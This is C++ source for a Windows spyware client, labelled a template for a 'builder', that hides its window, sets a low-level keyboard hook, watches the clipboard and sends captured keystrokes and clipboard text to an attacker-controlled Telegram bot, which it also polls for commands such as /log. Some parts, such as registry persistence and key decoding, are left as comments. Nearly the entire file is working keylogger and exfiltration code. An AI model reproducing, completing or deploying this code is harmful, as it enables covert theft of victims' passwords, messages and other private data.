// client.cpp - Template for the builder to modify
#define _WIN32_WINNT 0x0601
#include <windows.h>
#include <wininet.h>
#include <iostream>
#include <string>
#include <vector>
#include <thread>
#include <queue>
#include <mutex>
#include <condition_variable>
#include <fstream>
#include <chrono>
#include <codecvt>
#include <locale>
#include <wincrypt.h>
#include <urlmon.h>
#include <shellapi.h>
#include <gdiplus.h>

#pragma comment(lib, "wininet.lib")
#pragma comment(lib, "urlmon.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "gdiplus.lib")
#pragma comment(lib, "wincrypt.lib")

// === CONFIGURATION - To be replaced by the Builder ===
const std::string BOT_TOKEN = "YOUR_TELEGRAM_BOT_API_TOKEN";
const std::string ADMIN_CHAT_ID = "YOUR_ADMIN_CHAT_ID";
const int POLL_INTERVAL_MS = 10000; // Check for commands every 10 seconds
// === END CONFIGURATION ===

std::string lastClipboardText;
std::queue<std::string> messageQueue;
std::mutex queueMutex, clipboardMutex;
HHOOK hKeyboardHook = NULL;
std::wstring keystrokeBuffer;
bool isRunning = true;

// Function to send a message via Telegram Bot
bool SendTelegramMessage(const std::string& message) {
    HINTERNET hInternet = InternetOpenA("TelegramBot", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return false;

    std::string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/sendMessage";
    std::string data = "chat_id=" + ADMIN_CHAT_ID + "&text=" + message;

    HINTERNET hConnect = InternetOpenUrlA(hInternet, url.c_str(), data.c_str(), (DWORD)data.length(), INTERNET_FLAG_RELOAD, 0);
    if (!hConnect) {
        InternetCloseHandle(hInternet);
        return false;
    }

    InternetCloseHandle(hConnect);
    InternetCloseHandle(hInternet);
    return true;
}

// Function to send a document (like a log file) via Telegram Bot
bool SendTelegramDocument(const std::string& filePath, const std::string& caption) {
    // Implementation for file upload using multipart/form-data would go here.
    // It's more complex, requiring WinINet calls to create a form upload.
    // For now, we'll just send the content as a message if possible.
    std::ifstream file(filePath);
    if (file) {
        std::string content((std::istreambuf_iterator<char>(file)), std::istreambuf_iterator<char>());
        SendTelegramMessage("FILE: " + caption + "\n" + content);
    }
    return true;
}

// Function to get data from a URL (for checking Telegram messages)
std::string GetHTTPData(const std::string& url) {
    HINTERNET hInternet = InternetOpenA("TGClient", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) return "";

    HINTERNET hUrl = InternetOpenUrlA(hInternet, url.c_str(), NULL, 0, INTERNET_FLAG_RELOAD, 0);
    if (!hUrl) {
        InternetCloseHandle(hInternet);
        return "";
    }

    char buffer[4096];
    DWORD bytesRead;
    std::string result;

    while (InternetReadFile(hUrl, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        result += buffer;
    }

    InternetCloseHandle(hUrl);
    InternetCloseHandle(hInternet);
    return result;
}

// Function to check for new commands from the Telegram Bot
void CheckForCommands() {
    std::string url = "https://api.telegram.org/bot" + BOT_TOKEN + "/getUpdates?timeout=10&allowed_updates=[\"message\"]";
    std::string response = GetHTTPData(url);

    // Very basic parsing. In a real scenario, use a proper JSON parser.
    if (response.find("\"text\"") != std::string::npos) {
        size_t cmdPos = response.find("/log");
        if (cmdPos != std::string::npos) {
            // Parse the number of lines to send
            // Send the log file via SendTelegramDocument or send last X lines as a message
            SendTelegramMessage("[+] Log command received. Sending log.");
        }
        // Add parsing for other commands: /clipboard, /screenshot, /shell, /sysinfo
    }
}

// Command Handler Thread
void CommandThread() {
    while (isRunning) {
        CheckForCommands();
        std::this_thread::sleep_for(std::chrono::milliseconds(POLL_INTERVAL_MS));
    }
}

// Keylog hook procedure
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* kbd = (KBDLLHOOKSTRUCT*)lParam;
        if (wParam == WM_KEYDOWN) {
            // ... (Keylogging logic from your original code goes here)
            // Append characters to keystrokeBuffer

            // Periodically send the buffer
            if (keystrokeBuffer.length() > 100) {
                std::wstring_convert<std::codecvt_utf8<wchar_t>> converter;
                std::string str = converter.to_bytes(keystrokeBuffer);
                SendTelegramMessage("[Keystrokes] " + str);
                keystrokeBuffer.clear();
            }
        }
    }
    return CallNextHookEx(hKeyboardHook, nCode, wParam, lParam);
}

// Clipboard monitoring
void MonitorClipboard() {
    std::string currentText;
    while (isRunning) {
        if (OpenClipboard(NULL)) {
            HANDLE hData = GetClipboardData(CF_TEXT);
            if (hData) {
                char* pszText = static_cast<char*>(GlobalLock(hData));
                if (pszText) {
                    currentText = pszText;
                    GlobalUnlock(hData);
                    if (currentText != lastClipboardText) {
                        lastClipboardText = currentText;
                        SendTelegramMessage("[Clipboard] " + currentText);
                    }
                }
            }
            CloseClipboard();
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(1000));
    }
}

// Main entry point (hidden)
int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    // Hide the window
    ShowWindow(GetConsoleWindow(), SW_HIDE);

    // Set persistence in registry (from your original code)
    // ...

    // Start threads
    std::thread cmdThread(CommandThread);
    std::thread clipThread(MonitorClipboard);

    // Set keyboard hook
    hKeyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);

    // Main message loop
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0) > 0) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    isRunning = false;
    cmdThread.join();
    clipThread.join();
    UnhookWindowsHookEx(hKeyboardHook);
    return 0;
}
